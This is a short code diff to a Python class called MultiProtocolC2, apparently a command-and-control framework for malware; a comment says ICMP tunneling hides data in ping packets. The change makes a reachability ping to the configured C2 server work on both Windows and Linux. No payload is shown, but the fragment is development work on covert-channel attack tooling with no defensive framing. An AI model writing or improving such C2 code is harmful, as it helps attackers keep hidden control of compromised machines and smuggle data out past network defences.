@@ -158,10 +158,12 @@ class MultiProtocolC2:
             # ICMP tunneling hides data in ping packets
             
             import subprocess
+            import platform
             
-            # Test ping
+            # Test ping (Linux uses -c, Windows uses -n)
+            param = '-n' if platform.system().lower() == 'windows' else '-c'
             result = subprocess.run(
-                ['ping', '-n', '1', self.config.c2.c2_server],
+                ['ping', param, '1', self.config.c2.c2_server],
                 capture_output=True,
                 timeout=5
             )
